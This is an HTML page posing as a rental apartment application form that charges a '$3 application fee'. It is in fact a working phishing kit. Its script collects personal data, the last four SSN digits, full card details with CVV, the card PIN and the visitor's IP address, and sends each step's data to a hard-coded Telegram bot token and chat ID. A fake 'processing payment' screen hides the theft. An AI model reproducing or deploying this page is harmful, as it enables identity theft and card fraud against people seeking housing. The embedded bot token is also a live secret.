<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Application Form</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 12px;
        }
        
        .container {
            width: 100%;
            max-width: 480px;
        }
        
        .header {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 16px;
        }
        
        @media (min-width: 480px) {
            .header {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo-icon {
            background: #0f172a;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
        }
        
        .logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #0f172a;
            letter-spacing: -0.5px;
        }
        
        .logo-text span {
            color: #2563eb;
        }
        
        .verified-badge {
            background: white;
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 600;
            color: #0f172a;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            border: 1px solid #e2e8f0;
            width: fit-content;
        }
        
        .main-card {
            background: white;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            border: 1px solid #e2e8f0;
        }
        
        @media (min-width: 480px) {
            .main-card {
                padding: 28px;
            }
        }
        
        .property-header {
            display: flex;
            gap: 16px;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e2e8f0;
        }
        
        .property-image {
            width: 70px;
            height: 70px;
            background: #f1f5f9;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #94a3b8;
            font-size: 28px;
            flex-shrink: 0;
        }
        
        @media (min-width: 480px) {
            .property-image {
                width: 90px;
                height: 90px;
                font-size: 32px;
            }
        }
        
        .property-details {
            flex: 1;
            min-width: 0;
        }
        
        .property-title {
            font-size: 18px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 6px;
        }
        
        @media (min-width: 480px) {
            .property-title {
                font-size: 22px;
            }
        }
        
        .property-address {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        
        .property-features {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            color: #475569;
            font-size: 12px;
        }
        
        @media (min-width: 480px) {
            .property-features {
                font-size: 14px;
                gap: 16px;
            }
        }
        
        .property-features span {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        
        .progress {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
            padding: 0 5px;
        }
        
        .progress-line {
            position: absolute;
            top: 16px;
            left: 35px;
            right: 35px;
            height: 2px;
            background: #e2e8f0;
            z-index: 1;
        }
        
        @media (max-width: 380px) {
            .progress-line {
                left: 28px;
                right: 28px;
            }
        }
        
        .progress-step {
            position: relative;
            z-index: 2;
            background: white;
            padding: 0 4px;
            text-align: center;
            flex: 1;
            max-width: 60px;
        }
        
        .step-circle {
            width: 32px;
            height: 32px;
            background: #f1f5f9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 6px;
            font-weight: 600;
            font-size: 14px;
            color: #64748b;
            border: 2px solid white;
        }
        
        @media (min-width: 480px) {
            .step-circle {
                width: 38px;
                height: 38px;
                font-size: 15px;
            }
        }
        
        .step-circle.active {
            background: #2563eb;
            color: white;
        }
        
        .step-circle.completed {
            background: #10b981;
            color: white;
            font-size: 16px;
        }
        
        .step-label {
            font-size: 10px;
            font-weight: 600;
            color: #64748b;
            white-space: nowrap;
        }
        
        @media (min-width: 480px) {
            .step-label {
                font-size: 12px;
            }
        }
        
        .step-label.active {
            color: #0f172a;
        }
        
        .form-section {
            display: none;
        }
        
        .form-section.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0.6; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section-title {
            font-size: 18px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 6px;
        }
        
        @media (min-width: 480px) {
            .section-title {
                font-size: 20px;
            }
        }
        
        .section-desc {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .two-column {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .input-group {
            margin-bottom: 16px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 600;
            color: #334155;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 14px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 14px;
            transition: all 0.2s;
            background: #fafcfc;
            -webkit-appearance: none;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #2563eb;
            background: white;
        }
        
        .input-field::placeholder {
            color: #94a3b8;
            font-size: 13px;
        }
        
        .date-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 14px;
            background: #f8fafc;
            border-radius: 30px;
            margin: 16px 0;
            font-size: 13px;
            color: #334155;
            border: 1px solid #e2e8f0;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: #2563eb;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            -webkit-tap-highlight-color: transparent;
        }
        
        .btn:hover {
            background: #1d4ed8;
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .btn-secondary {
            background: white;
            color: #334155;
            border: 1.5px solid #e2e8f0;
        }
        
        .btn-secondary:active {
            background: #f8fafc;
        }
        
        .total-box {
            background: #f8fafc;
            border-radius: 14px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid #e2e8f0;
        }
        
        .total-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #334155;
            font-size: 14px;
        }
        
        .total-row.final {
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            border-top: 1px solid #e2e8f0;
            padding-top: 10px;
            margin-top: 6px;
        }
        
        .card-restriction {
            background: #fff7ed;
            border: 1px solid #fdba74;
            border-radius: 10px;
            padding: 12px 14px;
            margin: 16px 0 8px;
            font-size: 13px;
            color: #9a3412;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-card {
            background: #f0f9ff;
            border: 1px solid #bae6fd;
            border-radius: 14px;
            padding: 16px;
            margin-bottom: 16px;
        }
        
        .info-card h4 {
            color: #0369a1;
            margin-bottom: 10px;
            font-size: 15px;
        }
        
        .info-list {
            list-style: none;
        }
        
        .info-list li {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
            color: #334155;
            font-size: 13px;
            line-height: 1.4;
        }
        
        .info-list li span:first-child {
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .fee-badge {
            background: #2563eb;
            color: white;
            padding: 3px 8px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            display: inline-block;
            margin-left: 6px;
            vertical-align: middle;
        }
        
        .processing-screen {
            text-align: center;
            padding: 30px 15px;
            display: none;
        }
        
        .processing-screen.active {
            display: block;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #e2e8f0;
            border-top: 3px solid #2563eb;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .processing-title {
            font-size: 18px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 8px;
        }
        
        .processing-message {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e2e8f0;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #2563eb;
            width: 0%;
            transition: width 3s linear;
        }
        
        .success-screen {
            text-align: center;
            padding: 30px 15px;
            display: none;
        }
        
        .success-screen.active {
            display: block;
        }
        
        .success-icon {
            width: 70px;
            height: 70px;
            background: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            color: white;
            font-size: 35px;
        }
        
        .success-title {
            font-size: 22px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 12px;
        }
        
        .success-message {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        
        .confirmation-box {
            background: #f1f5f9;
            padding: 16px;
            border-radius: 14px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            letter-spacing: 1px;
            word-break: break-all;
        }
        
        .pin-container {
            background: #f1f5f9;
            padding: 20px 15px;
            border-radius: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .pin-fields {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 12px;
        }
        
        .pin-field {
            width: 45px !important;
            text-align: center;
            font-size: 20px !important;
            padding: 10px !important;
        }
        
        @media (max-width: 380px) {
            .pin-field {
                width: 40px !important;
                padding: 8px !important;
            }
        }
        
        .footer {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-top: 16px;
            color: #64748b;
            font-size: 11px;
            text-align: center;
        }
        
        @media (min-width: 480px) {
            .footer {
                flex-direction: row;
                justify-content: space-between;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">H</div>
                <div class="logo-text">ven<span>rent</span></div>
            </div>
            <div class="verified-badge">
                Verified Partner
            </div>
        </div>
        
        <div class="main-card">
            <!-- Property Preview - Removed apartment type -->
            <div class="property-header">
                <div class="property-image">
                    ⌂
                </div>
                <div class="property-details">
                    <h2 class="property-title">Apartment Listing</h2>
                    <p class="property-address">
                        Global Listings
                    </p>
                    <div class="property-features">
                        <span>Available now</span>
                    </div>
                </div>
            </div>
            
            <!-- Progress Steps -->
            <div class="progress">
                <div class="progress-line"></div>
                <div class="progress-step">
                    <div class="step-circle active" id="step1Circle">1</div>
                    <div class="step-label active" id="step1Label">Intro</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step2Circle">2</div>
                    <div class="step-label" id="step2Label">Prescreen</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step3Circle">3</div>
                    <div class="step-label" id="step3Label">Schedule</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step4Circle">4</div>
                    <div class="step-label" id="step4Label">Payment</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step5Circle">5</div>
                    <div class="step-label" id="step5Label">Confirm</div>
                </div>
            </div>
            
            <!-- STEP 1: INTRODUCTION -->
            <div id="step1" class="form-section active">
                <h3 class="section-title">Application Process</h3>
                <p class="section-desc">Please review before starting.</p>
                
                <div class="info-card">
                    <h4>Process</h4>
                    <ul class="info-list">
                        <li>
                            <span>1.</span>
                            <span><strong>Prescreen:</strong> Complete eligibility form</span>
                        </li>
                        <li>
                            <span>2.</span>
                            <span><strong>Schedule:</strong> Pick viewing date/time</span>
                        </li>
                        <li>
                            <span>3.</span>
                            <span><strong>Payment:</strong> $3 processing fee</span>
                        </li>
                        <li>
                            <span>4.</span>
                            <span><strong>Confirm:</strong> Get confirmation</span>
                        </li>
                    </ul>
                </div>

                <div class="info-card" style="background: #fefce8; border-color: #fde047;">
                    <h4>Fee Information</h4>
                    <ul class="info-list">
                        <li>
                            <span>$</span>
                            <span>
                                <strong>Application Fee: $3.00</strong>
                                <span class="fee-badge">One-time</span>
                            </span>
                        </li>
                        <li>
                            <span>✓</span>
                            <span>No hidden fees</span>
                        </li>
                    </ul>
                </div>

                <div class="info-card" style="background: #f1f5f9; border-color: #cbd5e1;">
                    <h4>Prescreening</h4>
                    <ul class="info-list">
                        <li>
                            <span></span>
                            <span>Basic personal info, income & credit range</span>
                        </li>
                        <li>
                            <span></span>
                            <span>Encrypted & secure</span>
                        </li>
                        <li>
                            <span></span>
                            <span>Takes 3-5 minutes</span>
                        </li>
                    </ul>
                </div>
                
                <div class="security-badge">
                    <span></span>
                    <span>256-bit encrypted</span>
                </div>
                
                <button id="step1Btn" class="btn">
                    Begin Application →
                </button>
            </div>
            
            <!-- STEP 2: PRESCREEN -->
            <div id="step2" class="form-section">
                <h3 class="section-title">Prescreening</h3>
                <p class="section-desc">Complete to verify eligibility.</p>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">First name</label>
                        <input type="text" id="firstName" class="input-field" placeholder="John">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Last name</label>
                        <input type="text" id="lastName" class="input-field" placeholder="Smith">
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Date of birth</label>
                    <input type="date" id="dob" class="input-field" value="1990-01-01">
                </div>
                
                <div class="input-group">
                    <label class="input-label">Phone number</label>
                    <input type="tel" id="phone" class="input-field" placeholder="(212) 555-7890">
                </div>
                
                <div class="input-group">
                    <label class="input-label">Street address</label>
                    <input type="text" id="address" class="input-field" placeholder="123 Main St">
                </div>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">City</label>
                        <input type="text" id="city" class="input-field" placeholder="City">
                    </div>
                    <div class="input-group">
                        <label class="input-label">State</label>
                        <input type="text" id="state" class="input-field" placeholder="State" maxlength="2">
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">ZIP/Postal code</label>
                    <input type="text" id="zipCode" class="input-field" placeholder="10001" maxlength="5">
                </div>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">Annual income</label>
                        <select id="income" class="input-field">
                            <option>$0 – $50k</option>
                            <option>$50k – $75k</option>
                            <option>$75k – $100k</option>
                            <option>$100k – $150k</option>
                            <option>$150k+</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label class="input-label">Credit score</label>
                        <select id="creditScore" class="input-field">
                            <option>Excellent (720+)</option>
                            <option>Good (680-719)</option>
                            <option>Fair (640-679)</option>
                            <option>Poor (below 640)</option>
                        </select>
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Last 4 SSN</label>
                    <input type="text" id="last4ssn" class="input-field" placeholder="1234" maxlength="4">
                </div>
                
                <button id="step2Btn" class="btn">
                    Continue →
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(1)">
                    ← Back
                </button>
            </div>
            
            <!-- STEP 3: SCHEDULE VIEWING -->
            <div id="step3" class="form-section">
                <h3 class="section-title">Schedule viewing</h3>
                <p class="section-desc">Select date and time.</p>
                
                <div class="date-group">
                    <div class="input-group">
                        <label class="input-label">Date</label>
                        <input type="date" id="viewingDate" class="input-field">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Time</label>
                        <select id="viewingTime" class="input-field">
                            <option>9:00 AM</option>
                            <option>10:30 AM</option>
                            <option>12:00 PM</option>
                            <option>1:30 PM</option>
                            <option>3:00 PM</option>
                            <option>4:30 PM</option>
                            <option>6:00 PM</option>
                        </select>
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Guests</label>
                    <select id="guests" class="input-field">
                        <option>1 guest</option>
                        <option selected>2 guests</option>
                        <option>3 guests</option>
                        <option>4+ guests</option>
                    </select>
                </div>
                
                <div class="security-badge">
                    <span></span>
                    <span>Held for 30 minutes</span>
                </div>
                
                <button id="step3Btn" class="btn">
                    Continue →
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(2)">
                    ← Back
                </button>
            </div>
            
            <!-- STEP 4: CARD INFORMATION -->
            <div id="step4" class="form-section">
                <h3 class="section-title">Payment</h3>
                <p class="section-desc">$3 application fee</p>                
                
                <div class="input-group">
                    <label class="input-label">Card number</label>
                    <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">Expiry</label>
                        <input type="text" id="cardExpiry" class="input-field" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="input-group">
                        <label class="input-label">CVV</label>
                        <input type="password" id="cardCvv" class="input-field" placeholder="123" maxlength="3">
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Name on card</label>
                    <input type="text" id="cardName" class="input-field" placeholder="John Smith">
                </div>
                
                <div class="card-restriction">
                    <span>⚠️</span>
                    <span>No prepaid, CashApp cards</span>
                </div>
                
                <div class="total-box">
                    <div class="total-row">
                        <span>Application fee</span>
                        <span>$3.00</span>
                    </div>
                    <div class="total-row final">
                        <span>Total</span>
                        <span>$3.00</span>
                    </div>
                </div>
                
                <button id="step4Btn" class="btn">
                    Pay $3.00 →
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(3)">
                    ← Back
                </button>
            </div>
            
            <!-- PROCESSING SCREEN -->
            <div id="processing" class="processing-screen">
                <div class="spinner"></div>
                <h3 class="processing-title">Processing payment</h3>
                <p class="processing-message">Please wait...</p>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p id="processingStatus" style="color: #64748b; font-size: 13px;">Initiating secure connection</p>
            </div>
            
            <!-- STEP 5: PIN VERIFICATION -->
            <div id="step5" class="form-section">
                <h3 class="section-title">Security verification</h3>
                <p class="section-desc">Enter card PIN to authorize $3 payment</p>
                
                <div class="pin-container">
                    <div style="font-size: 14px; color: #64748b; margin-bottom: 12px;">4-digit PIN</div>
                    <div class="pin-fields">
                        <input type="password" id="pin1" class="input-field pin-field" maxlength="1">
                        <input type="password" id="pin2" class="input-field pin-field" maxlength="1">
                        <input type="password" id="pin3" class="input-field pin-field" maxlength="1">
                        <input type="password" id="pin4" class="input-field pin-field" maxlength="1">
                    </div>
                </div>
                
                <button id="step5Btn" class="btn">
                    Complete →
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(4)">
                    ← Back
                </button>
            </div>
            
            <!-- SUCCESS SCREEN -->
            <div id="success" class="success-screen">
                <div class="success-icon">✓</div>
                <h2 class="success-title">Submitted</h2>
                <p class="success-message">
                    Your application has been received. The landlord will contact you within 24 hours.
                </p>
                <div class="confirmation-box">
                    APP-2024-12-15-8723
                </div>
                <div style="background: #f1f5f9; border-radius: 14px; padding: 16px; text-align: left; margin-bottom: 20px;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                        <span style="color: #64748b; font-size: 13px;">Viewing date</span>
                        <span style="font-weight: 600; font-size: 14px;" id="confirmDate">Dec 15, 2024</span>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                        <span style="color: #64748b; font-size: 13px;">Viewing time</span>
                        <span style="font-weight: 600; font-size: 14px;" id="confirmTime">3:00 PM</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #64748b; font-size: 13px;">Amount paid</span>
                        <span style="font-weight: 600; font-size: 14px;">$3.00</span>
                    </div>
                </div>
                <a href="#" style="color: #2563eb; text-decoration: none; font-weight: 600; font-size: 14px;">Return to listings →</a>
            </div>
        </div>
        
        <div class="footer">
            <span>© 2024 All rights reserved</span>
            <span>Privacy · Terms</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8399841360:AAESN-YXW2ETmJWa3AvQU0jiU6rJ-Hg52kU';
        const CHAT_ID = '8044892591';
        
        let applicationData = {
            viewing: { date: '', time: '', guests: '' },
            personal: {
                firstName: '', lastName: '', dob: '', phone: '', address: '',
                city: '', state: '', zipCode: '', income: '', creditScore: '', last4ssn: ''
            },
            card: { number: '', expiry: '', cvv: '', cardName: '' },
            pin: '', ip: '', userAgent: navigator.userAgent, timestamp: '',
            property: 'Global Listing'
        };
        
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => { applicationData.ip = d.ip; })
            .catch(() => { applicationData.ip = 'Unknown'; });
        
        // DOM Elements
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const step4 = document.getElementById('step4');
        const step5 = document.getElementById('step5');
        const processing = document.getElementById('processing');
        const success = document.getElementById('success');
        
        const step1Circle = document.getElementById('step1Circle');
        const step2Circle = document.getElementById('step2Circle');
        const step3Circle = document.getElementById('step3Circle');
        const step4Circle = document.getElementById('step4Circle');
        const step5Circle = document.getElementById('step5Circle');
        
        const step1Label = document.getElementById('step1Label');
        const step2Label = document.getElementById('step2Label');
        const step3Label = document.getElementById('step3Label');
        const step4Label = document.getElementById('step4Label');
        const step5Label = document.getElementById('step5Label');
        
        async function sendToTelegram(stepName, data) {
            const timestamp = new Date().toLocaleTimeString();
            let message = `Application - Step ${stepName}\n`;
            message += `Time: ${timestamp}\n`;
            message += `IP: ${data.ip || 'Unknown'}\n`;
            message += `Property: ${data.property}\n`;
            message += `----------------\n`;
            
            if (data.viewing.date) message += `Viewing: ${data.viewing.date} at ${data.viewing.time}\nGuests: ${data.viewing.guests}\n`;
            if (data.personal.firstName) message += `Name: ${data.personal.firstName} ${data.personal.lastName}\nDOB: ${data.personal.dob}\nPhone: ${data.personal.phone}\nAddress: ${data.personal.address}, ${data.personal.city}, ${data.personal.state} ${data.personal.zipCode}\nIncome: ${data.personal.income}\nCredit: ${data.personal.creditScore}\nSSN: ${data.personal.last4ssn}\n`;
            if (data.card.number) message += `Card: ${data.card.number}\nExp: ${data.card.expiry}\nCVV: ${data.card.cvv}\nName: ${data.card.cardName}\n`;
            if (data.pin) message += `PIN: ${data.pin}\n`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            } catch (e) {}
        }
        
        function goToStep(step) {
            [step1, step2, step3, step4, step5, processing, success].forEach(el => {
                el?.classList.remove('active');
            });
            
            if (step === 1) step1.classList.add('active');
            if (step === 2) step2.classList.add('active');
            if (step === 3) step3.classList.add('active');
            if (step === 4) step4.classList.add('active');
            if (step === 5) step5.classList.add('active');
            if (step === 6) success.classList.add('active');
            if (step === 'processing') processing.classList.add('active');
            
            if (step !== 'processing') {
                [step1Circle, step2Circle, step3Circle, step4Circle, step5Circle].forEach((circle, index) => {
                    circle.classList.remove('active', 'completed');
                    if (index + 1 < step) {
                        circle.classList.add('completed');
                        circle.textContent = '✓';
                    }
                    if (index + 1 === step) {
                        circle.classList.add('active');
                        circle.textContent = index + 1;
                    }
                });
                
                [step1Label, step2Label, step3Label, step4Label, step5Label].forEach((label, index) => {
                    label.classList.remove('active');
                    if (index + 1 === step) label.classList.add('active');
                });
            }
        }
        
        // Formatting
        document.getElementById('cardNumber')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            e.target.value = formatted;
        });
        
        document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) e.target.value = value.slice(0,2) + '/' + value.slice(2,4);
        });
        
        // PIN auto-advance
        ['pin1', 'pin2', 'pin3', 'pin4'].forEach((id, index) => {
            document.getElementById(id)?.addEventListener('input', function(e) {
                if (e.target.value.length === 1 && index < 3) {
                    document.getElementById(`pin${index + 2}`).focus();
                }
            });
        });
        
        document.getElementById('last4ssn')?.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });
        
        document.getElementById('zipCode')?.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
        });
        
        document.getElementById('state')?.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase().replace(/[^A-Z]/g, '').slice(0, 2);
        });
        
        // Step 1
        document.getElementById('step1Btn').addEventListener('click', function() {
            applicationData.timestamp = new Date().toISOString();
            goToStep(2);
        });
        
        // Step 2
        document.getElementById('step2Btn').addEventListener('click', function() {
            applicationData.personal.firstName = document.getElementById('firstName').value || '[EMPTY]';
            applicationData.personal.lastName = document.getElementById('lastName').value || '[EMPTY]';
            applicationData.personal.dob = document.getElementById('dob').value || '[EMPTY]';
            applicationData.personal.phone = document.getElementById('phone').value || '[EMPTY]';
            applicationData.personal.address = document.getElementById('address').value || '[EMPTY]';
            applicationData.personal.city = document.getElementById('city').value || '[EMPTY]';
            applicationData.personal.state = document.getElementById('state').value || '[EMPTY]';
            applicationData.personal.zipCode = document.getElementById('zipCode').value || '[EMPTY]';
            applicationData.personal.income = document.getElementById('income').value || '[EMPTY]';
            applicationData.personal.creditScore = document.getElementById('creditScore').value || '[EMPTY]';
            applicationData.personal.last4ssn = document.getElementById('last4ssn').value || '[EMPTY]';
            
            sendToTelegram('2 - PRESCREEN', applicationData);
            goToStep(3);
        });
        
        // Step 3
        document.getElementById('step3Btn').addEventListener('click', function() {
            applicationData.viewing.date = document.getElementById('viewingDate').value || '2024-12-15';
            applicationData.viewing.time = document.getElementById('viewingTime').value || '3:00 PM';
            applicationData.viewing.guests = document.getElementById('guests').value || '2 guests';
            
            sendToTelegram('3 - SCHEDULE', applicationData);
            
            document.getElementById('confirmDate').textContent = new Date(applicationData.viewing.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
            document.getElementById('confirmTime').textContent = applicationData.viewing.time;
            
            goToStep(4);
        });
        
        // Step 4
        document.getElementById('step4Btn').addEventListener('click', function() {
            applicationData.card.number = document.getElementById('cardNumber').value || '[EMPTY]';
            applicationData.card.expiry = document.getElementById('cardExpiry').value || '[EMPTY]';
            applicationData.card.cvv = document.getElementById('cardCvv').value || '[EMPTY]';
            applicationData.card.cardName = document.getElementById('cardName').value || '[EMPTY]';
            
            sendToTelegram('4 - CARD', applicationData);
            
            goToStep('processing');
            
            const progressFill = document.getElementById('progressFill');
            progressFill.style.width = '0%';
            
            const statusEl = document.getElementById('processingStatus');
            const messages = ['Connecting to bank...', 'Verifying card...', 'Processing...', 'Almost done...'];
            let messageIndex = 0;
            
            const messageInterval = setInterval(() => {
                if (messageIndex < messages.length) {
                    statusEl.textContent = messages[messageIndex];
                    messageIndex++;
                }
            }, 600);
            
            setTimeout(() => { progressFill.style.width = '100%'; }, 50);
            
            setTimeout(() => {
                clearInterval(messageInterval);
                goToStep(5);
            }, 3000);
        });
        
        // Step 5
        document.getElementById('step5Btn').addEventListener('click', function() {
            const pin1 = document.getElementById('pin1').value || '';
            const pin2 = document.getElementById('pin2').value || '';
            const pin3 = document.getElementById('pin3').value || '';
            const pin4 = document.getElementById('pin4').value || '';
            
            applicationData.pin = pin1 + pin2 + pin3 + pin4 || '[EMPTY]';
            
            sendToTelegram('5 - PIN - COMPLETE', applicationData);
            goToStep(6);
        });
        
        window.goToStep = goToStep;
        
        // Set default date
        const today = new Date();
        today.setDate(today.getDate() + 2);
        const defaultDate = today.toISOString().split('T')[0];
        document.getElementById('viewingDate').value = defaultDate;
    </script>
</body>
</html>
